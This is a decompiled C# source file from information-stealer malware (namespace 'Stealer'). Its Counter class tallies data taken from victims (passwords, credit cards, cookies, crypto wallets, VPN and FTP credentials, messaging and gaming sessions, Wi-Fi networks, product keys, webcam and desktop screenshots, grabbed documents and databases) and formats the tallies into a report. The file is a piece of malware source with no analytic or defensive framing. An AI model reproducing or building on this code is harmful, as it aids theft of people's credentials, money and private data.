﻿using System;
using System.Collections.Generic;

namespace Stealer
{
	// Token: 0x02000010 RID: 16
	internal sealed class Counter
	{
		// Token: 0x06000045 RID: 69 RVA: 0x00002B67 File Offset: 0x00000D67
		public static string GetSValue(string application, bool value)
		{
			if (!value)
			{
				return "";
			}
			return "\n   ∟ " + application;
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00002B7D File Offset: 0x00000D7D
		public static string GetIValue(string application, int value)
		{
			if (value == 0)
			{
				return "";
			}
			return "\n   ∟ " + application + ": " + value.ToString();
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00002BA0 File Offset: 0x00000DA0
		public static string GetLValue(string application, List<string> value, char separator = '∟')
		{
			value.Sort();
			if (value.Count == 0)
			{
				return "\n   ∟ " + application + " (No data)";
			}
			return string.Concat(new string[]
			{
				"\n   ∟ ",
				application,
				":\n\t\t\t\t\t\t\t",
				separator.ToString(),
				" ",
				string.Join("\n\t\t\t\t\t\t\t" + separator.ToString() + " ", value)
			});
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00002C1C File Offset: 0x00000E1C
		public static string GetBValue(bool value, string success, string failed)
		{
			if (!value)
			{
				return "\n   ∟ " + failed;
			}
			return "\n   ∟ " + success;
		}

		// Token: 0x0400003A RID: 58
		public static int Passwords = 0;

		// Token: 0x0400003B RID: 59
		public static int CreditCards = 0;

		// Token: 0x0400003C RID: 60
		public static int AutoFill = 0;

		// Token: 0x0400003D RID: 61
		public static int Cookies = 0;

		// Token: 0x0400003E RID: 62
		public static int History = 0;

		// Token: 0x0400003F RID: 63
		public static int Bookmarks = 0;

		// Token: 0x04000040 RID: 64
		public static int Downloads = 0;

		// Token: 0x04000041 RID: 65
		public static int VPN = 0;

		// Token: 0x04000042 RID: 66
		public static int Pidgin = 0;

		// Token: 0x04000043 RID: 67
		public static int Wallets = 0;

		// Token: 0x04000044 RID: 68
		public static int FTPHosts = 0;

		// Token: 0x04000045 RID: 69
		public static bool Telegram = false;

		// Token: 0x04000046 RID: 70
		public static bool Steam = false;

		// Token: 0x04000047 RID: 71
		public static bool Uplay = false;

		// Token: 0x04000048 RID: 72
		public static bool Discord = false;

		// Token: 0x04000049 RID: 73
		public static int SavedWifiNetworks = 0;

		// Token: 0x0400004A RID: 74
		public static bool ProductKey = false;

		// Token: 0x0400004B RID: 75
		public static bool DesktopScreenshot = false;

		// Token: 0x0400004C RID: 76
		public static bool WebcamScreenshot = false;

		// Token: 0x0400004D RID: 77
		public static int GrabberDocuments = 0;

		// Token: 0x0400004E RID: 78
		public static int GrabberSourceCodes = 0;

		// Token: 0x0400004F RID: 79
		public static int GrabberDatabases = 0;

		// Token: 0x04000050 RID: 80
		public static int GrabberImages = 0;

		// Token: 0x04000051 RID: 81
		public static bool BankingServices = false;

		// Token: 0x04000052 RID: 82
		public static bool CryptoServices = false;

		// Token: 0x04000053 RID: 83
		public static bool PornServices = false;

		// Token: 0x04000054 RID: 84
		public static List<string> DetectedBankingServices = new List<string>();

		// Token: 0x04000055 RID: 85
		public static List<string> DetectedCryptoServices = new List<string>();

		// Token: 0x04000056 RID: 86
		public static List<string> DetectedPornServices = new List<string>();
	}
}
